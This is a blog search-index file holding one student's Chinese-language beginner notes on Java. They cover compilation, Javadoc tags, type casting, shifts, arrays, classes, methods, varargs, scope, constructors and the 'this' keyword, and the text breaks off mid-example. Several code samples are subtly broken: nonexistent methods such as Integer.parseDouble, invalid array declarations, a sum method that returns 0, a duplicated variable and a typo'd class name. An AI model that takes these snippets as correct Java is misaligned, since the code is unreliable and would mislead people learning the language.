<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java笔记</title>
      <link href="/2024/12/06/java%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/06/java%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="java运行机制"><a class="markdownIt-Anchor" href="#java运行机制">#</a> java 运行机制</h1><ol><li>.java 文件是源代码，.class 文件是字节码，javac.exe 编译源代码为字节码</li><li>每有一个类，编译后都会生成一个.class 文件</li></ol><p><strong>JDK JRE JVM</strong></p><p>JDK = JRE + Java 开发工具</p><p>JRE = JVM + 核心类库</p><p>JVM：Java virtual machine</p><h2 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项">#</a> 注意事项：</h2><ol><li>源文件的组成部分是类（class）</li><li>java 应用程序入口是 main () 方法，固定书写格式：public static void main (String [] args) {}</li><li>一个源文件最多只能有一个 public 类，其他不限</li><li>如果源文件包含一个 public 类，那文件名必须按该类名命名</li><li>main 方法可以写在非 public 类，然后指定运行非 public 类，这样入口方法就是非 public 类的 main 方法</li></ol><h1 id="转义字符"><a class="markdownIt-Anchor" href="#转义字符">#</a> 转义字符</h1><p>\t：制表位，对齐，固定宽度</p><p>\r：一个回车，对齐到第一个字并逐个替换，比如 System.out.println (“我爱你 \r 他”)，会输出他爱你</p><p>如果是 System.out.println (“我爱你 \r\n 他”) 就会输出两行</p><p>我爱你</p><p>他</p><h1 id="文档注释"><a class="markdownIt-Anchor" href="#文档注释">#</a> 文档注释</h1><p><a href="https://blog.csdn.net/qq_41872247/article/details/117778467">Javadoc 写法和标签总结_javadoc 标签大全 - CSDN 博客</a></p><p>在方法的上面输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br></pre></td></tr></table></figure><p>然后回车，就会自动生成一个 javadoc 格式的文档，然后就可以填内容了</p><p>和其他注释最主要的区别就是 javadoc 的注释可以在我们鼠标放到方法名 / 类名 / 变量名上面的时候，直接看到其内容，而双斜杠的注释不行</p><p>所以按照一般来说，我们会在类 / 变量 / 方法的注释中使用 javadoc 的形式，而在某段代码的注释使用双斜杠形式</p><h2 id="用法"><a class="markdownIt-Anchor" href="#用法">#</a> 用法</h2><p>javadoc -d 文件夹名 -xx -yy Demo3.java</p><p>假设在 d 盘且文件名为 tch，所以下面这个就是</p><p>javadoc -d d:\ -author -version tch.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tch</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="常用javadoc标签"><a class="markdownIt-Anchor" href="#常用javadoc标签">#</a> 常用 javadoc 标签</h2><table><thead><tr><th>标签</th><th>描述</th><th>标签类型</th></tr></thead><tbody><tr><td>@author</td><td>作者标识</td><td>包、 类、接口</td></tr><tr><td>@deprecated</td><td>标识当前 API 已经过期，仅为了保证兼容性依然存在，以此告之开发者不应再用这个 API</td><td>包、类、接口、值域、构造函数、 方法</td></tr><tr><td></td><td>指明当前文档根目录的路径</td><td></td></tr><tr><td>@exception</td><td>标志一个类抛出的异常</td><td>构造函数、 方法</td></tr><tr><td></td><td>从直接父类继承的注释</td><td></td></tr><tr><td></td><td>链接到某个特定的成员对应的文档中</td><td>包、类、接口、值域、构造函数、 方法</td></tr><tr><td></td><td>插入一个到另一个主题的链接，但是该链接显示纯文本字体</td><td>包、类、接口、值域、构造函数、 方法</td></tr><tr><td>@param</td><td>方法的入参名及描述信息，如入参有特别要求，可在此注释</td><td>构造函数、方法</td></tr><tr><td>@return</td><td>对函数返回值的注释</td><td>方法</td></tr><tr><td>@see</td><td>引用，查看相关内容，如类、方法、变量等</td><td>包、类、接口、值域、构造函数、 方法</td></tr><tr><td>@serial</td><td>说明一个序列化属性</td><td></td></tr><tr><td>@serialData</td><td>说明通过 writeObject () 和 writeExternal () 方法写的数据</td><td></td></tr><tr><td>@serialField</td><td>说明一个 ObjectStreamField 组件</td><td>@</td></tr><tr><td>@since</td><td>描述文本，API 在什么程序的什么版本后开发支持</td><td>包、类、接口、值域、构造函数、 方法</td></tr><tr><td>@throws</td><td>构造函数或方法所会抛出的异常</td><td>构造函数、 方法</td></tr><tr><td></td><td>显示常量的值，该常量必须是 static 属性</td><td>静态值域</td></tr><tr><td>@version</td><td>版本号</td><td>包、 类、接口</td></tr><tr><td><strong>对两种标签格式的说明：</strong></td><td></td><td></td></tr></tbody></table><ul><li>@tag 格式的标签（不被 { } 包围的标签）为块标签，只能在主要描述（类注释中对该类的详细说明为主要描述）后面的标签部分（如果块标签放在主要描述的前面，则生成 API 帮助文档时会检测不到主要描述）。</li><li>{@tag} 格式的标签（由 { } 包围的标签）为内联标签，可以放在主要描述中的任何位置或块标签的注释中</li></ul><h1 id="数据类型转换细节"><a class="markdownIt-Anchor" href="#数据类型转换细节">#</a> 数据类型转换细节</h1><h2 id="自动转换"><a class="markdownIt-Anchor" href="#自动转换">#</a> 自动转换</h2><ol><li>（byte short）和 char 之间不会相互自动转换</li><li>byte short char 他们三者可以计算，在计算时首先转换为 int 类型<ul><li>哪怕是相同的类型，比如 byte 和 byte 计算，他也会先转成 int 再计算，结果类型也就是 int，另外两个也是的</li></ul></li><li>布尔类型不参与类型自动转换</li></ol><h2 id="强制转换"><a class="markdownIt-Anchor" href="#强制转换">#</a> 强制转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">123.5</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">int</span>)a;</span><br><span class="line"><span class="comment">//字符串强制转换</span></span><br><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> Integer.parseInt(a);</span><br><span class="line"><span class="type">double</span> <span class="variable">num2</span> <span class="operator">=</span> Integer.parseDouble(a);</span><br><span class="line"><span class="type">long</span> <span class="variable">num3</span> <span class="operator">=</span> Integer.parseLong(a);</span><br><span class="line"><span class="comment">//其他类型以此类推</span></span><br><span class="line"><span class="comment">//而char类型的强制转换就只会截取字符串的第一个字符 </span></span><br><span class="line">System.out.println(a.charAt(<span class="number">0</span>));<span class="comment">//输出a的第一个字符</span></span><br></pre></td></tr></table></figure><h1 id="位移运算"><a class="markdownIt-Anchor" href="#位移运算">#</a> 位移运算</h1><ol><li>算术右移 &gt;&gt;：低位溢出，符号位不变，并用符号位补溢出的高位，可以理解为右移一位就除以 2</li><li>算术左移 &lt;&lt;：符号位不变，低位补 0，可以理解为左移一位就乘以 2</li><li>'&gt;&gt;&gt;' 逻辑右移也叫无符号右移，运算规则是：低位溢出，高位补 0</li></ol><h1 id="数组"><a class="markdownIt-Anchor" href="#数组">#</a> 数组</h1><ol><li><p>不知道值的时候比如需要输入就用动态，已知数组的值比如用来加密的表就用静态</p></li><li><p>数组如果未赋值，每个类型都有其对应的默认值：数字类型全是 0 或 0.0（浮点），char 为 \u000，boolean 为 false，String 为 null</p></li><li><p>数组的赋值为地址复制，如果只想值复制的话，可以先分配空间后再用遍历赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr1[]=&#123;<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">arr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">int</span>[arr1.length];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr1.length;i++) &#123;</span><br><span class="line">    arr2[i] = arr1[i];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="动态初始化"><a class="markdownIt-Anchor" href="#动态初始化">#</a> 动态初始化</h2><p>int [] arr= new arr [10]; 或者 int arr [] = new arr [10];</p><p>也可以先声明再分配空间：</p><p>int arr[];</p><p>arr = new int[10]；</p><h2 id="静态初始化"><a class="markdownIt-Anchor" href="#静态初始化">#</a> 静态初始化</h2><p>int tch[] = {1，2，3，4，5};</p><h2 id="扩容"><a class="markdownIt-Anchor" href="#扩容">#</a> 扩容</h2><p>用新数组扩容并转移地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">newarr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">int</span>[arr.length+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++) &#123;</span><br><span class="line">    newarr[i] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">newarr[newarr.length-<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">arr = newarr;</span><br></pre></td></tr></table></figure><h2 id="二维数组"><a class="markdownIt-Anchor" href="#二维数组">#</a> 二维数组</h2><ul><li><p>java 中二维数组的列数可以不确定，第一个一维可以有五个元素，第二个一维可以只有 3 个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++) &#123;</span><br><span class="line">    arr[i] = <span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];<span class="comment">//在这里给每个一维数组分配长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[][] = &#123; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;, &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125; &#125;;<span class="comment">//静态</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> arr[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];<span class="comment">//动态</span></span><br><span class="line"><span class="comment">//或者先声明</span></span><br><span class="line"><span class="type">int</span> arr[][];</span><br><span class="line">arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"><span class="comment">//还可以这样</span></span><br><span class="line"><span class="type">int</span>[] arr[] = <span class="keyword">new</span> <span class="title class_">arr</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"><span class="comment">//这种方式可以同时定义一个一维和二维</span></span><br><span class="line"><span class="type">int</span>[] arr1,arr2[];</span><br></pre></td></tr></table></figure><h1 id="类与对象"><a class="markdownIt-Anchor" href="#类与对象">#</a> 类与对象</h1><h2 id="创建规则"><a class="markdownIt-Anchor" href="#创建规则">#</a> 创建规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Cat &#123;</span><br><span class="line">String name;</span><br><span class="line">int age;</span><br><span class="line">String color;</span><br><span class="line">&#125;</span><br><span class="line">//使用时，先实例化再引用</span><br><span class="line">Cat cat1 = new Cat();//cat1就是对象名 </span><br><span class="line">cat1.name = &quot;小白&quot;;</span><br><span class="line">cat1.age = 3;</span><br><span class="line">cat1.color = &quot;白色&quot;;</span><br><span class="line">//如果不对类中的属性赋值的话，就是默认值，默认值规则和数组一样</span><br></pre></td></tr></table></figure><ul><li>对象的复制是指向地址的</li></ul><h2 id="类和对象的内存分配机制"><a class="markdownIt-Anchor" href="#类和对象的内存分配机制">#</a> 类和对象的内存分配机制</h2><ul><li>栈：一般存放基本数据类型</li><li>堆：存放对象（Cat cat，数组等）</li><li>方法区：常量池（常量，比如字符串），类加载信息</li></ul><h2 id="创建对象的流程简单分析"><a class="markdownIt-Anchor" href="#创建对象的流程简单分析">#</a> 创建对象的流程简单分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">p.age = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><ol><li>先加载 Person 类信息（属性和方法信息，只加载一次）</li><li>在堆中分配空间，进行默认初始化（默认值）</li><li>把地址赋给 p，让 p 指向对象</li><li>进行指定的初始化，比如上面代码的赋值</li></ol><h1 id="方法"><a class="markdownIt-Anchor" href="#方法">#</a> 方法</h1><h2 id="如何创建和引用"><a class="markdownIt-Anchor" href="#如何创建和引用">#</a> 如何创建和引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tch</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">  <span class="type">Personn</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();<span class="comment">//分配空间</span></span><br><span class="line">  p1.speak();<span class="comment">//引用</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//创建</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">speak</span><span class="params">()</span> &#123;<span class="comment">//无传入值</span></span><br><span class="line">System.out.println(<span class="string">&quot;I&#x27;m a good man&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法调用过程"><a class="markdownIt-Anchor" href="#方法调用过程">#</a> 方法调用过程</h2><ol><li>程序执行到方法时，会开辟一个独立空间（栈空间）</li><li>当方法执行完毕，或者执行到 return 语句时，就会返回</li><li>返回到调用方法的地方</li><li>返回后继续执行方法后面的代码</li><li>当 main 方法 (栈) 执行完毕后整个程序退出</li></ol><h2 id="一些细节"><a class="markdownIt-Anchor" href="#一些细节">#</a> 一些细节</h2><ol><li>有多个返回值的时候可以用数组</li><li>void 类型不可以 return 值，但可以只写 return</li><li>同类中的方法可以直接调用，不用创建对象</li></ol><h2 id="传参机制"><a class="markdownIt-Anchor" href="#传参机制">#</a> 传参机制</h2><ol><li>基本数据类型的传参就是拷贝</li><li>引用数据类型的传参是指向地址</li></ol><h1 id="递归"><a class="markdownIt-Anchor" href="#递归">#</a> 递归</h1><ol><li>执行一个方法时，就创建一个新的受保护的独立空间（栈空间）</li><li>方法的局部变量时独立的，不会相互影响</li><li>如果方法中使用的是引用类型变量，就会共享该引用类型的数据</li></ol><p>递归主要是对于规律的应用吧，只要微操作和超级操作是对的，就不要去想里面的过程是怎么样，两个操作都是正确的，其实也就互相证明了这个程序是对的，要相信它可以实现我们的要求</p><h1 id="方法重载"><a class="markdownIt-Anchor" href="#方法重载">#</a> 方法重载</h1><p>java 中允许同一个类中有多个同名方法的存在，但形参列表要不一样。重载减轻了起名和记名的麻烦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比如最基础的</span></span><br><span class="line">System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure><ol><li>方法名要一致</li><li>形参列表必须不同，类型、个数、顺序等</li><li>返回类型：无要求</li></ol><h1 id="可变参数"><a class="markdownIt-Anchor" href="#可变参数">#</a> 可变参数</h1><p>java 允许将同一个类中，多个同名同功能但参数个数不同的方法，封装成一个方法。可通过可变参数实现</p><h2 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法">#</a> 基本语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问修饰符 返回类型 方法名(数据类型...形参名) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用可变参数时，可以把参数当作数组来使用，也可以把数组传进来</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>... nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++) &#123;</span><br><span class="line">        res += nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="细节"><a class="markdownIt-Anchor" href="#细节">#</a> 细节</h2><ol><li>可变参数的个数可以是 0 也可以是任意多个</li><li>可变参数的本质就是数组</li><li>可变参数可以和普通类型的参数一起放在形参列表，但是必须保证可变参数在最后，且一个形参列表中只能有一个可变参数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a,<span class="type">double</span> b,<span class="type">char</span>... c)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="作用域"><a class="markdownIt-Anchor" href="#作用域">#</a> 作用域</h1><ol><li>java 中主要的变量就是属性（成员变量）和局部变量</li><li>局部变量一般是指在成员方法中定义的变量</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//age就是全局变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//这里的n和name就是局部变量</span></span><br><span class="line">        <span class="comment">//n和name的作用域就在cry中</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;jack&quot;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(age);<span class="comment">//这里可以用age但不能用cry中的变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>java 中作用域的分类：</li></ul><p>全局变量：也就是属性，作用域为整个类体</p><p>局部变量：也就是除了属性之外的其他变量，作用域为定义它的代码块中</p><ul><li><p>全局变量可以不赋值，直接使用，因为有默认值，局部变量必须赋值后才能使用，因为没有默认值</p></li><li><p>局部变量和属性（全局变量）可以重名，访问时遵循就近原则</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;tom&quot;</span>;<span class="comment">//这行在就会输出tom，反之输出jack</span></span><br><span class="line">        System.out.print(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以跨类调用全局变量</li><li>全局变量可以加修饰符，局部不可以</li></ul><h1 id="构造器方法"><a class="markdownIt-Anchor" href="#构造器方法">#</a> 构造器 / 方法</h1><ul><li>构造器的修饰符可以默认，也可以是 public，protected，private</li><li>构造器没有返回值</li><li>方法名和类名必须一样</li><li>参数列表和成员方法一样的规则</li><li>构造器的调用系统完成，在创建对象时，系统会自动调用该类的构造器完成对对象的<strong>初始化</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">constructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="comment">//new一个对象时，直接通过构造器指定名字和年龄</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;tch&quot;</span>, <span class="number">21</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//构造器的名称和类名要一样</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String pName, <span class="type">int</span> pAge)</span> &#123;</span><br><span class="line">        name = pName;</span><br><span class="line">        age = pAge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>构造器也可以重载，因为构造器本身也是方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">constructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;tch&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;tchhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String pName, <span class="type">int</span> pAge)</span> &#123;</span><br><span class="line">        name = pName;</span><br><span class="line">        age = pAge;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String pName)</span> &#123;<span class="comment">//只有一个形参</span></span><br><span class="line">        name = pName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序员如果没定义构造器，系统会自动生成一个默认无参构造器</li><li>有参构造器在 new 新对象的时候要提供参数，无参构造器不需要，相当于给了多种 new 新对象的方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="comment">/*    Person(); &#123;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;<span class="comment">//这里是空的，但实际上有一个默认的构造器，可以通过反编译出来，javap</span></span><br></pre></td></tr></table></figure><ul><li>一旦定义了自己的构造器，默认的构造器就被覆盖了，不能再使用默认无参构造器，除非显式地定义一下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">    public Person(String pName, int pAge) &#123;</span><br><span class="line">    //...</span><br><span class="line">    &#125;</span><br><span class="line">    Person() &#123;//显式的定义一下</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="this关键字"><a class="markdownIt-Anchor" href="#this关键字">#</a> this 关键字</h1><p>在这里定义构造器的时候，如果可以把形参定义为 String name, int age 看上去就会更简介，但是如果这样定义就会导致 name 的值为空，这里可以用 this 来解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String dName, <span class="type">int</span> dAge)</span> &#123;</span><br><span class="line">name = dName;</span><br><span class="line">age = dAge;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java 虚拟机会给每个对象分配 this，代表当前对象，哪个对象调用 this 就指的是哪个对象的地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>this 不能在类定义的外部使用，只能在类定义的方法中使用</li><li>访问成员方法的语法：this. 方法名 (参数列表)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 